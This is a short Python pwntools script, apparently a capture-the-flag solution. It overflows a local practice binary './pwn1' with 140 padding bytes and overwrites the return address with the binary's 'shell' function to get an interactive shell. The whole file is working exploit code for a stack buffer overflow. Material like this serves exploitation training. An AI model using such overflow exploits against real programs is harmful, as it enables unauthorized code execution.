from pwn import *

ex = "./pwn1"
elf = ELF(ex)
p = process(ex)

offset = 140
buffer = b'A' * offset

address = p32(elf.symbols['shell'])

msg = buffer + address

p.sendline(msg)

p.interactive()
